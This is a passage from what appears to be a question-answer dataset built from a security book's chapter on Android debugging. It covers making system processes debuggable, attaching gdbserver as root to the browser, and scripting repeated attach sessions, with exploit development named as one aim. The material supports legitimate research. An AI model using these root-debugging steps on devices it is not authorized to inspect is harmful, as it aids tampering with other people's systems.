VM. This\nstep is not strictly necessary, as any such processes that start after changing the\nro.debuggable property will be debuggable. If the desired process is already\nrunning, it may suffi ce to restart only that process. However, for long-running\nprocesses and system services, restarting the Dalvik layer is necessary. To force\nthe Android Dalvik layer to restart, simply kill the system_server process. The\nfollowing excerpt shows the required commands:\nroot@maguro:/data/local/tmp # ps | ./busybox grep system_server\nsystem 527 174 953652 62492 ffffffff 4011c304 S system_server\nroot@maguro:/data/local/tmp # kill -9 527\nroot@maguro:/data/local/tmp #\nAfter the kill command is executed, the device should appear to reboot. This\nis normal and indicates that the Android Dalvik layer is restarting. The ADB\nconnection to the device should not be interrupted during this process. When\nthe home screen reappears, all Dalvik processes should show up as shown in\nFigure 7-6.\nFigure 7-6: Android Device Monitor with ro.debuggable=1\nIn addition to showing all processes, Figure 7-6 also shows the threads from\nthe system_process process. This would not be possible without using an\nc07.indd 11:8:41:AM 02/25/2014 Page 219\n220 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nengineering device or following the steps outlined in this section. After com-\npleting these steps, it is now possible to use DDMS, Android Device Monitor,\nor even Eclipse to debug any Dalvik process on the system.\nNOTE Pau Oliva’s RootAdb app automates the steps outlined in this section. You\ncan fi nd the app in Google Play at https://play.google.com/store/apps/\ndetails?id=org.eslack.rootadb.\nAttaching to Other Processes\nIn addition to basic profi ling and debugging, a device in full debug mode also\nallows debugging any Dalvik processes in real time. Attaching to processes is,\nagain, a simple step-by-step process.\nWith Eclipse up and running, change the perspective to the DDMS perspective\nusing the perspective selector in the upper-right corner. In the Devices view,\nselect the desired target process, for example system_process. From the Run\nmenu, select Debug Confi gurations to open the Debug Confi gurations dialog\nbox. Select Remote Java Application from the list on the left side of the dialog\nand click the New Launch Confi guration button. Enter any arbitrary name in\nthe Name entry box, for example Attacher. Under the Connect tab, select the\nAOSP Framework Source project created in the “Showing Framework Source\nCode” section earlier in this chapter. In the Host entry box, enter 127.0.0.1. In\nthe Port entry box, enter 8700.\nNOTE Port 8700 corresponds to whatever process is currently selected inside the\nDDMS perspective. Each debuggable process is assigned a unique port as well. Using\nthe process-specifi c port creates a debug confi guration that is specifi c to that process,\nas expected.\nFinally, click the Apply button and then the Debug button.\nAt this point, Eclipse has attached to the system_process process. Switching\nto the Debug perspective shows the active threads for the process in the Debug\nview. Clicking the Suspend button stops the selected thread. Figure 7-7 depicts\nEclipse attached to the system_process process, with the WifiManager service\nthread suspended.\nAs before, clicking the stack frames in the threads navigates to the relevant\nlocations in the source code. The only thing left is to utilize breakpoints and\nother features of the Eclipse debugger to track down bugs or explore the inner\nworkings of the system.\nc07.indd 11:8:41:AM 02/25/2014 Page 220"
  },
  {
    "input": "What are the key methods and considerations for debugging native code on Android, including the use of the NDK, Eclipse, AOSP, and non-AOSP devices?",
    "summary": "This chapter discusses debugging native code on Android, highlighting the challenges due to the lack of memory safety in C and C++ code. It covers various debugging methods, including using the Android NDK, Eclipse, AOSP, and gdbserver, with a focus on setting up the environment, attaching to processes, and using symbols for source-level debugging. The chapter also addresses the difficulties of debugging non-AOSP devices, which often lack symbols and require custom toolchains, and explains how to handle these issues. Finally, it mentions alternative debugging techniques like debug statements, on-device debugging with tools such as strace, and custom debuggers built using the ptrace API.",
    "output": "Chapter 7 ■ Debugging and Analyzing Vulnerabilities 221\nFigure 7-7: Eclipse attached to system_process\nDebugging Native Code\nThe C and C++ programming languages that are used to develop native code on\nAndroid lack the memory safety that Dalvik provides. With more pitfalls lurk-\ning, it is much more likely that mistakes will be made and crashes will occur.\nSome of these bugs will be more serious because of the potential for them to be\nexploited by an attacker. Consequently, getting to the root cause of the issue is\nparamount for both attackers and defenders. In either case, interactively debug-\nging the buggy program is the road most traveled to reach the desired outcome.\nThis section discusses the various options for debugging native code on\nAndroid. First, we discuss how you can use the Android Native Development\nKit (NDK) to debug the custom native code inside apps you compile. Second, we\ndemonstrate how to use Eclipse to debug native code. Third, we walk through the\nprocess of using AOSP to debug the Android browser on a Nexus device. Fourth,\nwe explain how to use AOSP to achieve full source-level interactive debugging.\nFinally, we discuss how to debug native code running on a non-Nexus device.\nc07.indd 11:8:41:AM 02/25/2014 Page 221\n222 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nDebugging with the NDK\nAndroid supports developing custom native code via the Android NDK. Since\nrevision 4b, the NDK has included a convenient script called ndk-gdb. This\nscript represents the offi cially supported method for debugging native code\nincluded in a developer’s Android app. This section describes the requirements,\ndetails the preparation process, explains the inner workings, and discusses the\nlimitations of this script.\nWARNING The Over-the-Air (OTA) updates for Android version 4.3 introduced\na compatibility issue with debugging using the NDK. You can fi nd more information,\nincluding workarounds, in Issue 58373 in the Android bug tracker. Android 4.4 fi xed\nthis issue.\nPreparing an App for Debugging\nThe fi rst thing that is important to recognize about the NDK’s debugging support\nis that it requires a device or emulator running Android 2.2 or newer. Further,\ndebugging native code with multiple threads requires using Android 2.3 or\nnewer. Unfortunately, pretty much all code on Android is multithreaded. On\nthe other hand, the number of devices that run such old versions of Android is\ndwindling. Finally, as you might guess, the target app must be built for debug-\nging during the preparation phase.\nPreparing your app varies depending on which build system you use. Enabling\ndebugging for native code using the NDK alone, via ndk-build, is accomplished\nby setting the NDK_DEBUG environment variable to 1. If you use Eclipse, you\nhave to modify project properties, as discussed in the next section. You can also\nbuild a debugging-enabled app using the Apache Ant build system by using the\nant debug command. Whichever build system you use, enabling debugging at\nbuild time is essential to successfully debugging the native code.\nNOTE Using the scripts discussed in this section requires the NDK directory to be in\nyour path.\nSeeing It in Action\nTo demonstrate native debugging with the NDK, and in general, we put together\na slightly modifi ed version of the “Hello World” application. Instead of displaying\nthe string, we use a Java Native Interface (JNI) method to return a string to the\napplication. The code for the demo application is included with the materials\nfor this chapter. The following excerpt shows the commands used for building\nthe application using the NDK:\ndev:NativeTest $ NDK_DEBUG=1 ndk-build\nc07.indd 11:8:41:AM 02/25/2014 Page 222\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 223\nGdbserver : [arm-linux-androideabi-4.6] libs/armeabi/gdbserver\nGdbsetup : libs/armeabi/gdb.setup\nCompile thumb : hello-jni <= hello-jni.c\nSharedLibrary : libhello-jni.so\nInstall : libhello-jni.so => libs/armeabi/libhello-jni.so\ndev:NativeTest $\nLooking at the output, it’s clear that setting the NDK_DEBUG environment\nvariable causes the ndk-build script to do a couple of extra things. First, the\nscript adds a gdbserver binary to the application package. This is necessary\nbecause devices don’t usually have a GDB server installed on them. Also, using a\ngdbserver binary that matches the GDB client ensures maximum compatibility\nand reliability while debugging. The second extra thing that the ndk-build script\ndoes is create a gdb.setup fi le. Peeking inside this fi le reveals that it is a short,\nauto-generated script for the GDB client. This script helps confi gure GDB so\nthat it can fi nd the local copies of libraries, including the JNI, and source code.\nWhen using this build method, building the native code is separate from\nbuilding the application package itself. To do the rest, use Apache Ant. You can\nbuild and install a debug package in a single step with Apache Ant by using\nthe ant debug install command. The following excerpt shows that process,\nthough much of the output has been omitted for brevity:\ndev:NativeTest $ ant debug install\nBuildfile: /android/ws/1/NativeTest/build.xml\n[...]\ninstall:\n[echo] Installing /android/ws/1/NativeTest/bin/MainActivity-debug.apk\nonto\ndefault emulator or device...\n[exec] 759 KB/s (393632 bytes in 0.506s)\n[exec] pkg: /data/local/tmp/MainActivity-debug.apk\n[exec] Success\nBUILD SUCCESSFUL\nTotal time: 16 seconds\nWith the package installed, you’re fi nally ready to begin debugging the app.\nWhen executed without any parameters, the ndk-gdb script attempts to fi nd\na running instance of the target application. If none is found, it prints an error\nmessage. There are many ways to deal with this issue, but all except one require\nmanually starting the application. The most convenient way is to supply the\n--start parameter to the ndk-gdb script, as seen in the following excerpt.\ndev:NativeTest $ ndk-gdb --start\nSet uncaught java.lang.Throwable\nSet deferred uncaught java.lang.Throwable\nInitializing jdb ...\n> Input stream closed.\nGNU gdb (GDB) 7.3.1-gg2\nCopyright (C) 2011 Free Software Foundation, Inc.\n[...]\nc07.indd 11:8:41:AM 02/25/2014 Page 223\n224 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nwarning: Could not load shared library symbols for 82 libraries, e.g.\nlibstdc++.so.\nUse the \"info sharedlibrary\" command to see the complete listing.\nDo you need \"set solib-search-path\" or \"set sysroot\"?\nwarning: Breakpoint address adjusted from 0x40179b79 to 0x40179b78.\n0x401bb5d4 in __futex_syscall3 () from\n/android/ws/1/NativeTest/obj/local/armeabi/libc.so\n(gdb) break Java_com_example_nativetest_MainActivity_stringFromJNI\nFunction \"Java_com_example_nativetest_MainActivity_stringFromJNI\" not\ndefined.\nMake breakpoint pending on future shared library load? (y or [n]) y\nBreakpoint 1 (Java_com_example_nativetest_MainActivity_stringFromJNI)\npending.\n(gdb) cont\nContinuing.\nThe biggest advantage to using this method is the ability to place breakpoints\nearly in the native code’s execution paths. However, this feature suffers from\nsome timing issues when using NDK r9 with Android 4.2.2 and 4.3. More\nspecifi cally, the application doesn’t start and instead displays the Waiting for\nDebugger dialog indefi nitely. Thankfully there is a simple workaround. After\nthe native GDB client comes up, manually run the Java debugger and connect\nto the default endpoint as seen here:\ndev:~ $ jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=65534\nSet uncaught java.lang.Throwable\nSet deferred uncaught java.lang.Throwable\nInitializing jdb ...\n>\nYou can execute this command by suspending the script or running the\ncommand in another window. After JDB is connected, the application starts\nexecuting, and the breakpoint you set in the previous excerpt should fi re.\nBreakpoint 1, Java_com_example_nativetest_MainActivity_stringFromJNI\n(env=0x40168d90, thiz=0x7af0001d) at jni/hello-jni.c:31\n31 __android_log_print(ANDROID_LOG_ERROR, \"NativeTest\", \"INSIDE\nJNI!\");\n(gdb)\nEmploying this workaround makes hitting early breakpoints easy. Even when\nstarting the app manually, it is usually possible to cause the application to re-\nexecute the onCreate event handler function by rotating the device orientation.\nThis can help hit some elusive breakpoints as well.\nNOTE While writing this book, we contributed a simple patch to fi x this issue.\nYou can fi nd the patch at https://code.google.com/p/android/issues/\ndetail?id=60685#c4.\nc07.indd 11:8:41:AM 02/25/2014 Page 224\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 225\nNewer versions of the NDK include the ndk-gdb-py script, which is similar\nto ndk-gdb except it is written in Python instead of shell script. Although this\nscript does not suffer from the endless Waiting for Debugger issue, it has issues\nof its own. To be more specifi c, it has issues when the application targets older\nversions of the Android SDK. Fixing this issue is a simple one-line change, but\nthe change was originally made to fi x a previous bug. Hopefully these issues\nget ironed out over time, and the debugging facilities of the NDK can be made\nmore robust and usable.\nLooking Under the Hood\nSo after dodging a minefi eld of issues, you are able to debug our native code.\nBut what really happens when you run the ndk-gdb script? Running the script\nwith the --verbose fl ag sheds some light on the subject. Consulting the offi cial\ndocumentation, included as docs/NDK-GDB.html in the NDK, also helps paint the\npicture. At around 750 lines of shell script, reading the entire thing is approach-\nable. The most relevant parts of the script lie in the fi nal 40 or so lines. The\nfollowing excerpt shows the lines from the Android NDK r9 for x86_64 Linux:\n708 # Get the app_server binary from the device\n709 APP_PROCESS=$APP_OUT/app_process\n710 run adb_cmd pull /system/bin/app_process `native_path $APP_PROCESS`\n711 log \"Pulled app_process from device/emulator.\"\n712\n713 run adb_cmd pull /system/bin/linker `native_path $APP_OUT/linker`\n714 log \"Pulled linker from device/emulator.\"\n715\n716 run adb_cmd pull /system/lib/libc.so `native_path $APP_OUT/libc.so`\n717 log \"Pulled libc.so from device/emulator.\"\nThe commands on lines 710, 713, and 716 download three crucial fi les from\nthe device. These fi les are the app_process, linker, and libc.so binaries. These\nfi les contain crucial information and some limited symbols. They do not contain\nenough information to enable source-level debugging, but the “Debugging with\nSymbols” section later in this chapter explains how to achieve that. Without\nthe downloaded fi les, the GDB client will have trouble properly debugging the\ntarget process, especially when dealing with threads. After pulling these fi les,\nthe script attempts to launch JDB to satisfy the “Waiting for Debugger” issue\nthat you dealt with previously. Finally, it launches the GDB client as shown here:\n730 # Now launch the appropriate gdb client with the right init\ncommands\n731 #\n732 GDBCLIENT=${TOOLCHAIN_PREFIX}gdb\n733 GDBSETUP=$APP_OUT/gdb.setup\n734 cp -f $GDBSETUP_INIT $GDBSETUP\n735 #uncomment the following to debug the remote connection only\n736 #echo \"set debug remote 1\" >> $GDBSETUP\nc07.indd 11:8:41:AM 02/25/2014 Page 225\n226 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\n737 echo \"file `native_path $APP_PROCESS`\" >> $GDBSETUP\n738 echo \"target remote :$DEBUG_PORT\" >> $GDBSETUP\n739 if [ -n \"$OPTION_EXEC\" ] ; then\n740 cat $OPTION_EXEC >> $GDBSETUP\n741 fi\n742 $GDBCLIENT -x `native_path $GDBSETUP`\nMost of these statements, on lines 733 through 741, are building up a script\nused by the GDB client. It starts by copying the original gdb.setup fi le that was\nplaced into the application during the debug build process. Next, a couple of\ncomments appear. Uncommenting these lines enables debugging the GDB pro-\ntocol communications itself. Debugging on this level is good for tracking down\ngdbserver instability issues, but isn’t helpful when debugging your own code.\nThe next two lines tell the GDB client where to fi nd the debug binary and how\nto connect to the waiting GDB server. On lines 739 through 741, ndk-gdb appends\na custom script that can be specifi ed with the -x or --exec fl ag. This option is\nparticularly useful for automating the creation of breakpoints or executing more\ncomplex scripts. More on this topic is discussed in the “Automating GDB Client”\nsection later in this chapter. Finally, the GDB client and the freshly generated\nGDB script are executed. Understanding how the ndk-gdb script works paves\nthe way for the types of advanced scripted debugging that is discussed in the\n“Increasing Automation” section later in this chapter.\nDebugging with Eclipse\nWhen version 20 of the ADT plug-in was released in June 2012, it included sup-\nport for building and debugging native code. With this addition, it was fi nally\npossible to use the Eclipse IDE to debug C/C++ code. However, installing a ver-\nsion of ADT with native code support is not enough to get started. This section\ndescribes the additional steps necessary to achieve source-level debugging for\nnative code inside the demonstration application.\nAdding Native Code Support\nAfter opening the project, the fi rst step to achieving native debugging is telling\nADT where to fi nd your NDK installation. Inside Eclipse, select Preferences from\nthe Window menu. Expand the Android item and select NDK. Now enter or\nbrowse to the path where your NDK is installed. Click Apply and then click OK.\nNormally, it would be necessary to add native code to the project as well.\nFortunately, the source code in this chapter’s accompanying materials already\nincludes the necessary native code. If there is an issue, or you want to add native\ncode to a new Android application project, the steps follow. Otherwise, it is safe\nto skip over the next paragraph.\nTo add native support to the project, start by right-clicking the project in the\nPackage Explorer view and selecting the Android Tools ➢ Add Native Support\nc07.indd 11:8:41:AM 02/25/2014 Page 226\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 227\nmenu item. In the dialog that displays, type the name of the JNI. In the case of\nour demonstration app, this is hello-jni. Click OK. At this point, ADT creates\nthe jni directory and adds a fi le called hello-jni.cpp to the project. The next\nstep is to tweak a few settings before launching the debugger.\nPreparing to Debug Native Code\nJust as you did before with ndk-gdb, you need to inform the Android build sys-\ntem that you want to build with debugging enabled. Doing this inside Eclipse\nrequires only a few simple actions. First, select Project ➢ Properties. Expand the\nC/++ Build option group and select Environment. Click the Add button. Enter\nNDK_DEBUG for the variable name and 1 for the value. After clicking OK, every-\nthing is set to begin debugging. To confi rm that the new environment variable\nis in effect, select Project ➢ Build All. Output similar to that displayed when\nusing ndk-gdb directly should be displayed in the Console view. In particular,\nlook for the lines starting with Gdb.\nSeeing It in Action\nBecause the goal is to debug the code, you still want to confi rm that everything\nis working as it should. The simplest way to do that is to verify that you can\ninteractively hit a breakpoint inside Eclipse. First, place a breakpoint inside\nthe JNI method where you want to break. For the demonstration app, the line\nwith the call to the __android_log_print function is an ideal location. After\nthe breakpoint is set, fi re up a debug session by clicking the Debug As toolbar\nbutton. If this application has never been debugged before, you see a dialog\nasking which way to debug it. For debugging native code, select Android Native\nApplication and click OK. ADT launches the native debugger, attaches to the\nremote process, and continues execution. With a bit of luck, you see our break-\npoint hit as shown in Figure 7-8.\nUnfortunately, success is left to luck because of another form of the Waiting\nfor Debugger issue. This time, rather than waiting forever, it gets dismissed\ntoo quickly and you miss the breakpoint the fi rst time around. Thankfully, the\norientation toggle workaround lets you cause the onCreate event to fi re again\nand thus re-execute your native code, thereby stopping on your breakpoint.\nDebugging with AOSP\nThe AOSP repository contains almost everything you need to get up and run-\nning. An ADB binary, which normally comes from the SDK Platform Tools, is the\nonly other thing that’s needed. Because Nexus devices are directly supported by\nAOSP, using a Nexus device for debugging native code provides the best experi-\nence. In fact, nearly all of the examples in this chapter were developed with the\nc07.indd 11:8:41:AM 02/25/2014 Page 227\n228 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nuse of a Nexus device. Further, Nexus devices ship with binaries built using the\nuserdebug build variant. This is evidenced by the existence of a .gnu_debuglink\nsection in the Executable and Linker Format (ELF) binary. Using this build\nvariant creates partial symbols for all the native code binaries on the device.\nThis section walks through the process of using an AOSP checkout to debug\nthe Android browser, which breaks down into three basic phases: setting up\nthe environment, attaching to the browser, and connecting the debugger client.\nFigure 7-8: Stopped at a native breakpoint in Eclipse\nNOTE Due to the security model of Android, debugging system processes written\nin native code requires root access. You can obtain root access by using an eng build\nor by applying the information supplied in Chapter 3.\nSetting Up the Environment\nBefore attaching GDB to the target process, you must set up your environment.\nUsing AOSP, you can accomplish this with only a few simple commands. In the\nfollowing excerpt, you set up the environment for debugging programs writing\nin C/C++ on a GSM Galaxy Nexus running Android 4.3 (JWR66Y).\ndev:~/android/source $ mkdir -p device/samsung && cd $_\ndev:~/android/source/device/samsung $ git clone \\\nc07.indd 11:8:41:AM 02/25/2014 Page 228\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 229\n/aosp-mirror/device/samsung/maguro.git\nCloning into 'maguro'...\ndone.\ndev:~/android/source/device/samsung $ git clone \\\n/aosp-mirror/device/samsung/tuna.git\nCloning into 'tuna'...\ndone.\ndev:~/android/source/device/samsung $ cd ../..\ndev:~/android/source $ . build/envsetup.sh\nincluding device/samsung/maguro/vendorsetup.sh\nincluding sdk/bash_completion/adb.bash\ndev:~/android/source $ lunch full_maguro-userdebug\n============================================\nPLATFORM_VERSION_CODENAME=REL\nPLATFORM_VERSION=4.3\nTARGET_PRODUCT=full_maguro\nTARGET_BUILD_VARIANT=userdebug\nTARGET_BUILD_TYPE=release\nTARGET_BUILD_APPS=\nTARGET_ARCH=arm\nTARGET_ARCH_VARIANT=armv7-a-neon\nTARGET_CPU_VARIANT=cortex-a9\nHOST_ARCH=x86\nHOST_OS=linux\nHOST_OS_EXTRA=Linux-3.2.0-52-generic-x86_64-with-Ubuntu-12.04-precise\nHOST_BUILD_TYPE=release\nBUILD_ID=JWR66Y\nOUT_DIR=out\n============================================\nThe fi rst few commands obtain the device-specifi c directories for the Galaxy\nNexus, which are required for this process. The device/samsung/maguro reposi-\ntory is specifi c to the GSM Galaxy Nexus, whereas the device/samsung/tuna\nrepository contains items shared with the CDMA/LTE Galaxy Nexus. Finally,\nyou set up and initialize the AOSP build environment by loading the build/\nenvsetup.sh script into your shell and executing the lunch command.\nWith the AOSP environment set up, the next step is to set up the device.\nBecause production images (user and userdebug builds) do not include a GDB\nserver binary, you need to upload one. Thankfully, the AOSP prebuilts direc-\ntory includes exactly the gdbserver binary you need. The next excerpt shows\nthe command for achieving this, including the path to the gdbserver binary\nwithin the AOSP repository:\ndev:~/android/source $ adb push prebuilts/misc/android-arm/gdbserver/\ngdbserver \\\n/data/local/tmp\n1393 KB/s (186112 bytes in 0.130s)\ndev:~/android/source $ adb shell chmod 755 /data/local/tmp/gdbserver\ndev:~/android/source $\nNow that the gdbserver binary is on the device, you are almost ready to\nattach to the browser process.\nc07.indd 11:8:41:AM 02/25/2014 Page 229\n230 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nIn this demonstration, you will be connecting the GDB client to the GDB\nserver using a standard TCP/IP connection. To do this, you must choose one of\ntwo methods. If the device is on the same Wi-Fi network as the debugging host,\nyou can simply use its IP address instead of 127.0.0.1 in the following sections.\nHowever, remote debugging over Wi-Fi can be troublesome due to slow speeds,\nsignal issues, power-saving features, or other issues. To avoid these issues, we\nrecommend debugging using ADB over USB when possible. Still, some situa-\ntions, such as debugging USB processing, may dictate which method needs to\nbe used. To use USB, you need to use ADB’s port-forwarding feature to open a\nconduit for your GDB client. Doing so is straightforward, as shown here:\ndev:~/android/source $ adb forward tcp:31337 tcp:31337\nWith this step completed, you have fi nished initializing your minimal debug-\nging environment.\nAttaching to the Browser\nThe next step is to use the GDB server to either execute the target program or\nattach to an existing process. Running the gdbserver binary without any argu-\nments shows the command-line arguments that it expects.\ndev:~/android/source $ adb shell /data/local/tmp/gdbserver\nUsage: gdbserver [OPTIONS] COMM PROG [ARGS ...]\ngdbserver [OPTIONS] --attach COMM PID\ngdbserver [OPTIONS] --multi COMM\nCOMM may either be a tty device (for serial debugging), or\nHOST:PORT to listen for a TCP connection.\nOptions:\n--debug Enable general debugging output.\n--remote-debug Enable remote protocol debugging output.\n--version Display version information and exit.\n--wrapper WRAPPER -- Run WRAPPER to start new programs.\nThe preceding usage output shows that three different modes are supported\nby this gdbserver binary. All three require a COMM parameter, which is described\nin the excerpt above. For this parameter, use the port that you forwarded previ-\nously, tcp:31337. The fi rst supported mode shown is for executing a program.\nIt allows specifying the target program and the desired parameters to pass to\nit. The second supported mode allows attaching to an existing process, using\nthe process ID specifi ed by the PID parameter. The third supported mode is\ncalled multiprocess mode. In this mode, gdbserver listens for a client but does\nnot automatically execute or attach to a process. Instead, it defers to the client\nfor instructions.\nc07.indd 11:8:41:AM 02/25/2014 Page 230\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 231\nFor the demonstration, we use attach mode because it is more resilient to\ncrashes in the GDB client or server, which unfortunately happen on occasion.\nAfter choosing an operating mode, you are ready to attach to the browser.\nHowever, attaching to the browser requires that is running already. It doesn’t\nrun automatically on boot, so you have to start it using the following command:\nshell@android:/ $ am start -a android.intent.action.VIEW \\\n-d about:blank com.google.android.browser\nStarting: Intent { act=android.intent.action.VIEW dat=about:blank }\nYou use the am command with the start parameter to send an intent asking\nthe browser to open and navigate to the about:blank URI. Further, you specify\nthe browser’s package name, com.google.android.browser, to prevent accidently\nspawning other browsers that may be installed. It’s a perfectly viable alternative\nto spawn the browser manually as well.\nThe last thing that you need to attach to the now-running browser is its\nprocess ID. Use the venerable BusyBox tool, either by itself or in combination\nwith the ps command, to fi nd this last detail preventing you from attaching.\n2051 shell@android:/ $ ps | /data/local/tmp/busybox grep browser\nu0_a4 2051 129 522012 59224 ffffffff 00000000 S\ncom.google.android.browser\nshell@android:/ $ /data/local/tmp/busybox pidof \\\ncom.google.android.browser\n2051\nNow, spawn gdbserver using attach mode. To do this, fi rst exit from the\nADB shell and return to the host machine shell. Use the adb shell command\nto spawn gdbserver, instructing it to attach to the browser’s process ID.\ndev:~/android/source $ adb shell su -c /data/local/tmp/gdbserver \\\n--attach tcp:31337 2225\nAttached; pid = 2225\nListening on port 31337\n^Z\n[1]+ Stopped adb shell su -c /data/local/tmp/gdbserver\n--attach tcp:31337 2225\ndev:~/android/source $ bg\n[1]+ adb shell su -c /data/local/tmp/gdbserver --attach tcp:31337 2225 &\nAfter gdbserver is started, use the Control-Z key combination to suspend the\nprocess. Then put the adb process into the background using bash’s bg command.\nAlternatively, you could send ADB to the background from the beginning using\nbash’s & control operator, which is similar to the bg command. This frees up the\nterminal so you can attach the GDB client.\nc07.indd 11:8:41:AM 02/25/2014 Page 231\n232 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nConnecting the GDB Client\nThe fi nal phase in the process is connecting the GDB client to the GDB server\nthat is listening on the device. AOSP includes a fully functioning GDB client.\nNewer revisions of AOSP even include Python support in the included GDB\nclient. You spawn and connect the client as shown here:\ndev:~/android/source $ arm-eabi-gdb -q\n(gdb) target remote :31337\nRemote debugging using :31337\nRemote debugging from host 127.0.0.1\n0x4011d408 in ?? ()\n(gdb) back\n#0 0x4011d408 in ?? ()\n#1 0x400d1fcc in ?? ()\n#2 0x400d1fcc in ?? ()\nBacktrace stopped: previous frame identical to this frame (corrupt\nstack?)\n(gdb)\nAfter executing the client, instruct it to connect to the waiting GDB server using\nthe target remote command. The argument to this command corresponds to\nthe port that you previously forwarded using ADB when setting up the envi-\nronment. Note that the GDB client defaults to using the local loopback interface\nwhen the IP address is omitted. From here, you have full access to the target\nprocess. You can set breakpoints, inspect registers, inspect memory, and more.\nUsing the gdbclient Command\nThe AOSP build environment event defines a bash built-in command,\ngdbclient, for automating much of the process covered earlier. It can forward\nports, spawn a GDB server, and connect the GDB client automatically. Based\non the requirement that the gdbserver binary is on the device and in the ADB\nuser’s execution path, it is likely intended to be used with a device running an\neng build. You can view the full defi nition of this built-in by using the follow-\ning shell command:\ndev:~/android/source $ declare -f gdbclient\ngdbclient ()\n{\n[...]\nThe entirety of the command was omitted for brevity. You are encouraged\nto follow along using your own build environment.\nThe fi rst thing that gdbclient does is query the Android build system to\nidentify details defi ned during the environment initialization process detailed\nearlier. This includes paths and variables such as the target architecture. Next,\ngdbclient attempts to determine how it was invoked. It can be started with\nc07.indd 11:8:41:AM 02/25/2014 Page 232\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 233\nzero, one, two, or three arguments. The fi rst argument is the name of a binary\nwithin the /system/bin directory. The second argument is the port number to\nforward, prefi xed by a colon character. These fi rst two arguments simply over-\nride the defaults of app_process and :5039, respectively.\nThe third argument specifi es the process ID or command name to which\nit will attach. If the third argument is a command name, gdbclient attempts\nto resolve the process ID of that command on the target device using the pid\nbuilt-in. When the third argument is successfully processed, gdbclient uses\nADB to automatically forward a port to the device and attaches the gdbserver\nbinary to the target process. If the third argument is omitted, the onus is on the\nuser to spawn a GDB server.\nNext, gdbclient generates a GDB script much like the ndk-gdb script does.\nIt sets up some symbol-related GDB variables and instructs the GDB client to\nconnect to the waiting GDB server. However, there are two big differences from\nthe ndk-gdb script. First, gdbclient depends on symbols from a custom build\nrather than pulling binaries from the target device. If no custom build was done,\ngdbclient is unlikely to work. Second, gdbclient does not allow the user to\nspecify any additional commands or scripts for the GDB client to execute. The\ninfl exibility and assumptions made by the gdbclient built-in make it diffi cult\nto use, especially in advanced debugging scenarios. Although it may be possible\nto work around some of these issues by redefi ning the gdbwrapper built-in or\ncreating a custom .gdbinit fi le, these options were not explored and are instead\nleft as an exercise to the reader.\nIncreasing Automation\nDebugging an application like the Android browser can be very time consuming.\nWhen developing exploits, reverse-engineering, or digging deep into a prob-\nlem, there are a few small things that can help a lot. Automating the process of\nspawning the GDB server and client helps streamline the debugging experience.\nUsing the methods outlined in this section also enables automating project-\nspecifi c actions, which in this demonstration apply directly to debugging the\nAndroid browser. You might notice that these methods are quite similar to those\nemployed in Chapter 6, but they aim to improve productivity for a researcher\ninstead of fully automating testing. The goal is to automate as many mundane\ntasks as possible while still giving the researcher room to apply their expertise.\nAutomating On-Device Tasks\nIn many scenarios, such as developing an exploit, it is necessary to engage in a\nlarge number of debugging sessions. Unfortunately, in attach mode, gdbserver\nexits after the debugging session completes. In these situations, it helps to use\na couple small shell scripts to automate the process of repeatedly attaching.\nc07.indd 11:8:41:AM 02/25/2014 Page 233\n234 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nThe fi rst step is to create the following small shell script on the host and make\nit executable.\ndev:~/android/source $ cat > debugging.sh\n#!/bin/sh\nwhile true; do\nsleep 4\nadb shell 'su -c /data/local/tmp/attach.sh' >> adb.log 2>&1\ndone\n^D\ndev:~/android/source $ chmod 755 debugging.sh\ndev:~/android/source $\nRunning this in the background on the host ensures that a gdbserver instance\nis re-spawned on the device four seconds after it exits. The delay is to give the\ntarget process time to clear out from the system. Though this could also be\naccomplished with a shell script on the device itself, running it on the host helps\nprevent accidentally exposing the gdbserver endpoint to untrusted networks.\nNext, create the /data/local/tmp/attach.sh shell script on the device and\nmake it executable.\nshell@maguro:/data/local/tmp $ cat > attach.sh\n#!/system/bin/sh\n# start the browser\nam start -a android.intent.action.VIEW -d about:blank \\\ncom.google.android.browser\n# wait for it to start\nsleep 2\n# attach gdbserver\ncd /data/local/tmp\nPID=`./busybox pidof com.google.android.browser` # requires busybox\n./gdbserver --attach tcp:31337 $PID\n^D\nshell@maguro:/data/local/tmp $ chmod 755 attach.sh\nshell@maguro:/data/local/tmp $\nThis script handles starting the browser, obtaining its process ID, and attach-\ning the GDB server to it. With the two scripts in place, simply execute the fi rst\nscript in the background on the host.\ndev:~/android/source $ ./debugging.sh &\n[1] 28994\nUsing these two small scripts eliminates unnecessarily switching windows\nto re-spawn gdbserver. This enables the researcher to focus on the task at hand,\nusing the GDB client to debug the target process.\nc07.indd 11:8:41:AM 02/25/2014 Page 234\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 235\nAutomating GDB Client\nAutomating the GDB client helps further streamline the analysis process. All\nmodern GDB clients support a custom scripting language specifi c to GDB.\nNewer versions of the AOSP GDB client include support for Python scripting\nas well. This section uses GDB scripting to automate the process of connecting\nto a waiting gdbserver process.\nFor simply attaching to the remote GDB server, it suffi ces to use the GDB cli-\nent’s -ex switch. This option enables the researcher to specify a single command\nto run after the GDB client starts. The following excerpt shows how you use\nthis to attach to your waiting GDB server using the target remote command:\ndev:~/android/source $ arm-eabi-gdb -q -ex \"target remote :31337\"\nRemote debugging using :31337\nRemote debugging from host 127.0.0.1\n0x401b5ee4 in ?? ()\n(gdb)\nSometimes, as you will see in the following sections, it’s necessary to auto-\nmatically execute several GDB client commands. Although it is possible to use\nthe -ex switch multiple times on one command line, another method is more\nsuitable. In addition to -ex, the GDB client also supports the -x switch. Using\nthis switch, a researcher places the commands they switch to use into a fi le\nand passes the fi lename as the argument following the -x switch. You saw this\nfeature used in the “Debugging with the NDK” section earlier in this chapter.\nAlso, GDB reads and executes commands from a fi le called .gdbinit in the cur-\nrent directory by default. Placing the script commands into this fi le alleviates\nthe need for specifying any extra switches to GDB at all.\nRegardless of which method you use, scripting GDB is extremely helpful 